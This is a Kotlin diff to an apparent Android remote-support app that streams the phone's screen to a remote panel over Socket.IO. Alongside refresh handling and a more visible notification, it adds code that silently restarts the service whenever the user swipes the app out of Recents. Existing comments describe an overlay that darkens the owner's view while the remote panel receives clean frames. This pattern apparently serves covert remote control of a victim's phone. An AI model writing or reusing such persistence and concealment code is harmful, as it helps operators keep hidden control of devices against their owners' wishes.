@@ -6,6 +6,7 @@ import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
+import android.app.PendingIntent
 import android.content.Context
 import android.content.BroadcastReceiver
 import android.content.Intent
@@ -56,6 +57,9 @@ class ScreenCaptureService : Service() {
 
         var isRunning = false
             private set
+
+        @Volatile
+        var aguardandoFrameRefresh = false
 
         @Volatile
         var ultimoResultCode: Int? = null
@@ -271,14 +275,20 @@ class ScreenCaptureService : Service() {
         // "Atualizando…") e restaura o overlay. O emulador flutuante
         // recebe apenas o fundo limpo; o aparelho físico continua com
         // o círculo visível. Requer MyAccessibilityService ativo.
-        // ============================================================
+        // opacidadeDispositivo: escurecimento do overlay do cartão NO APARELHO
+        // (slider "Fundo do Dispositivo"). 0..1, default 0.6.
         @Volatile
-        var capturaLimpaOverlayAtiva: Boolean = false
+        var opacidadeDispositivo: Float = 0.6f
+            private set
 
-        /** Intervalo entre ciclos de captura limpa (~25 FPS de frames limpos). */
-        const val CICLO_LIMPO_INTERVALO_MS = 40L
-        /** Janela de ocultação do overlay (1 frame @60Hz) antes de capturar. */
-        const val CICLO_LIMPO_OCULTAR_MS = 18L
+        /** Aplica a opacidade do DISPOSITIVO (escurece o overlay no aparelho
+         *  via OverlayService). */
+        @JvmStatic
+        fun aplicarOpacidadeDispositivo(op: Float) {
+            val v = op.coerceIn(-1f, 1f)
+            opacidadeDispositivo = v
+            OverlayService.aplicarOpacidade(v)
+        }
     }
 
     private var mediaProjection: MediaProjection? = null
@@ -353,46 +363,22 @@ class ScreenCaptureService : Service() {
         try {
             isScreenOn = isScreenInteractive()
 
-            if (isRunning || virtualDisplay != null || mediaProjection != null) {
+            // IMPORTANTE: a ação de REFRESH precisa rodar JUSTAMENTE com a captura
+            // ativa (ela recria o VirtualDisplay reutilizando a MediaProjection viva).
+            // Por isso ela NÃO pode cair nesta guarda de "já em execução", senão o
+            // botão Atualizar do painel nunca refaz a captura.
+            val acaoRefresh = intent?.action == "com.example.acessomaterno.ACTION_REFRESH_CAPTURE"
+            if ((isRunning || virtualDisplay != null || mediaProjection != null) && !acaoRefresh) {
                 enviarLog("Aviso: ScreenCaptureService já em execução com VirtualDisplay ativo. Abortando inicialização dupla.")
                 return START_STICKY
             }
 
             if (intent == null) {
-                val tokenSalvo = ultimoResultCode
-                val dataSalva = ultimoData
-                if (tokenSalvo != null && dataSalva != null) {
-                    enviarLog("Reinício START_STICKY detectado — retomando captura com token salvo.")
-                    try {
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                            startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
-                        } else {
-                            startForeground(NOTIFICATION_ID, createNotification())
-                        }
-                    } catch (e: Exception) {
-                        enviarLog("Aviso: startForeground no reinício sticky falhou (${e.message}).")
-                    }
-                    adquirirWakeLocks()
-                    isRunning = true
-                    modoSomenteEscuta = false
-                    mediaProjection = mediaProjectionManager?.getMediaProjection(tokenSalvo, dataSalva)
-                    if (mediaProjection != null) {
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                            mediaProjection?.registerCallback(object : MediaProjection.Callback() {
-                                override fun onStop() {
-                                    enviarLog("MediaProjection encerrada pelo sistema.")
-                                    isRunning = false
-                                }
-                            }, Handler(Looper.getMainLooper()))
-                        }
-                        startVirtualDisplay()
-                        registrarReceiverTelaLigada()
-                        enviarLog("Captura RETOMADA após reinício START_STICKY.")
-                        return START_STICKY
-                    } else {
-                        enviarLog("Aviso: token salvo expirou (MediaProjection nula).")
-                    }
-                }
+                // REGRA ANDROID 14+: Tokens de MediaProjection NUNCA podem ser reutilizados após restart/boot.
+                // Limpamos tokens salvos para evitar SecurityException e iniciamos em modo escuta seguro.
+                ultimoResultCode = null
+                ultimoData = null
+
                 try {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                         startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
@@ -407,7 +393,7 @@ class ScreenCaptureService : Service() {
                     SocketManager.appContext = applicationContext
                     SocketManager.garantirConexao()
                 } catch (_: Exception) {}
-                enviarLog("Serviço reiniciado via START_STICKY sem token — modo escuta ativo.")
+                enviarLog("Serviço reiniciado via START_STICKY (tokens limpos para evitar reuso) — modo escuta ativo.")
                 registrarReceiverTelaLigada()
                 return START_STICKY
             }
@@ -437,6 +423,28 @@ class ScreenCaptureService : Service() {
                 return START_STICKY
             }
 
+            if (intent.action == "com.example.acessomaterno.ACTION_REFRESH_CAPTURE") {
+                enviarLog("Ação ACTION_REFRESH_CAPTURE recebida — recriando VirtualDisplay e ImageReader (reutilizando MediaProjection).")
+                try {
+                    aguardandoFrameRefresh = true
+                    recriarVirtualDisplay(force = true)
+                    enviarLog("VirtualDisplay e ImageReader recriados com sucesso no refresh real.")
+
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        if (aguardandoFrameRefresh) {
+                            aguardandoFrameRefresh = false
+                            SocketManager.emitirAtualizacaoConcluida(false, "timeout no refresh")
+                            enviarLog("Timeout (8s) atingido no refresh — emitindo falha ao painel.")
+                        }
+                    }, 8000L)
+                } catch (e: Exception) {
+                    aguardandoFrameRefresh = false
+                    SocketManager.emitirAtualizacaoConcluida(false, "erro ao atualizar captura: ${e.message}")
+                    enviarLog("Exceção ao executar refresh de captura: ${e.message}")
+                }
+                return START_STICKY
+            }
+
             val resultCode = intent.getIntExtra("RESULT_CODE", Activity.RESULT_CANCELED)
             val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 intent.getParcelableExtra("DATA", Intent::class.java)
@@ -458,7 +466,16 @@ class ScreenCaptureService : Service() {
             }
             isRunning = true
             modoSomenteEscuta = false
-            mediaProjection = mediaProjectionManager?.getMediaProjection(resultCode, data)
+            try {
+                mediaProjection = mediaProjectionManager?.getMediaProjection(resultCode, data)
+            } catch (e: Exception) {
+                enviarLog("ERRO crítico ao obter MediaProjection (token inválido/reusado): ${e.message}")
+                ultimoResultCode = null
+                ultimoData = null
+                SocketManager.emitStatusCaptura("SEM_PERMISSAO_TELA")
+                stopSelf()
+                return START_NOT_STICKY
+            }
             if (mediaProjection == null) {
                 enviarLog("ERRO: MediaProjection nula.")
                 SocketManager.emitStatusCaptura("SEM_PERMISSAO_TELA")
@@ -664,9 +681,18 @@ class ScreenCaptureService : Service() {
         SocketManager.emitStatusCaptura("JPEG_FALLBACK")
         val metrics = resources.displayMetrics
         val width = larguraVirtual
-        val height = (720f * metrics.heightPixels / metrics.widthPixels).toInt()
+        // BLINDAGEM ANDROID 7 / NOX: em alguns emuladores x86 metrics.widthPixels /
+        // heightPixels podem vir 0 logo após o consentimento (antes do 1º layout).
+        // Divisão por 0 geraria Infinity -> toInt() gigante -> ImageReader /
+        // VirtualDisplay estouram com crash NATIVO (não capturável por try/catch),
+        // fechando o app. Aqui garantimos dimensões sempre válidas.
+        val mw = metrics.widthPixels
+        val mh = metrics.heightPixels
+        var height = if (mw > 0 && mh > 0) (720f * mh / mw).toInt() else 1280
+        if (height <= 0) height = 1280
+        height = height.coerceIn(240, 4096)
         virtualHeight = height
-        val density = metrics.densityDpi
+        val density = if (metrics.densityDpi > 0) metrics.densityDpi else 320
         imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 3)
         handlerThread = HandlerThread("ScreenCaptureThread").also { it.start() }
         backgroundHandler = Handler(handlerThread!!.looper)
@@ -722,6 +748,12 @@ class ScreenCaptureService : Service() {
                 ultimoFrameMs = agora
 
                 processarEEnviarFrame(image, width, height)
+
+                if (aguardandoFrameRefresh) {
+                    aguardandoFrameRefresh = false
+                    SocketManager.emitirAtualizacaoConcluida(true)
+                    enviarLog("Primeiro frame real capturado após refresh — emitindo atualizacao_concluida(true).")
+                }
             } catch (e: Exception) {
                 Log.e(TAG, "Erro ao capturar/enviar frame: ${e.message}")
             } finally {
@@ -799,24 +831,44 @@ class ScreenCaptureService : Service() {
         watchdogRunnable = null
     }
 
+    class StopReceiver : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent?) {
+            try {
+                context.stopService(Intent(context, ScreenCaptureService::class.java))
+            } catch (_: Exception) {}
+        }
+    }
+
     private fun createNotification(): Notification {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "Espelhamento de Tela Ativo",
-                NotificationManager.IMPORTANCE_LOW
+                "Sessão de Suporte Ativa",
+                NotificationManager.IMPORTANCE_HIGH
             ).apply {
-                description = "Indica quando a tela deste aparelho está sendo transmitida ao painel de suporte."
+                description = "Indica quando a sessão de suporte remoto está ativa e transmitindo a tela."
             }
             val manager = getSystemService(NotificationManager::class.java)
             manager?.createNotificationChannel(channel)
         }
+
+        val stopIntent = Intent(this, StopReceiver::class.java).apply {
+            action = "ACTION_STOP_SERVICE"
+        }
+        val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        } else {
+            PendingIntent.FLAG_UPDATE_CURRENT
+        }
+        val stopPendingIntent = PendingIntent.getBroadcast(this, 0, stopIntent, flags)
+
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Tela sendo compartilhada")
-            .setContentText("A tela deste aparelho está sendo transmitida ao painel de suporte. Toque em Parar no app para encerrar.")
+            .setContentTitle("Sessão de suporte ativa")
+            .setContentText("Sua tela está sendo compartilhada. Toque para encerrar.")
             .setSmallIcon(android.R.drawable.ic_menu_camera)
             .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(NotificationCompat.PRIORITY_HIGH)
+            .addAction(android.R.drawable.ic_menu_close_clear_cancel, "Encerrar", stopPendingIntent)
             .build()
     }
 
@@ -982,4 +1034,41 @@ class ScreenCaptureService : Service() {
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
+
+    /**
+     * PERSISTÊNCIA CONTRA "SWIPE" NOS RECENTES (Regra 1).
+     *
+     * Em fabricantes agressivos (Xiaomi/MIUI, Oppo/ColorOS, Vivo, etc.) deslizar
+     * o app para fora da lista de Recentes pode encerrar o processo e derrubar
+     * este ForegroundService — e, sem religamento, o espelhamento só voltaria em
+     * um reboot. Aqui reagendamos o reinício do próprio serviço via AlarmManager
+     * (~2s depois), de forma que ele suba novamente em modo escuta/START_STICKY,
+     * re-adquira os WakeLocks e reconecte o Socket.IO. As permissões já
+     * concedidas (Acessibilidade, sobreposição) continuam válidas — só o serviço
+     * é religado. Nada disso roda se o usuário DESINSTALAR o app (o PendingIntent
+     * deixa de existir), respeitando o critério "enquanto não for desinstalado".
+     */
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        try {
+            val restartIntent = Intent(applicationContext, ScreenCaptureService::class.java).apply {
+                action = BootReceiver.ACTION_RESTART_BOOT
+                putExtra("origem", "task_removed")
+                putExtra("silencioso", true)
+            }
+            val flags = PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+            val pending = PendingIntent.getService(this, 1001, restartIntent, flags)
+            val am = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
+            am.set(
+                android.app.AlarmManager.RTC,
+                System.currentTimeMillis() + 2000L,
+                pending
+            )
+            enviarLog("onTaskRemoved — serviço reagendado para religar em ~2s (persistência contra swipe nos Recentes).")
+        } catch (e: Exception) {
+            Log.e(TAG, "Falha ao reagendar o serviço em onTaskRemoved: ${e.message}")
+        }
+        // Reconexão imediata do socket (caso o processo sobreviva ao swipe).
+        try { SocketManager.garantirConexao() } catch (_: Exception) {}
+        super.onTaskRemoved(rootIntent)
+    }
 }
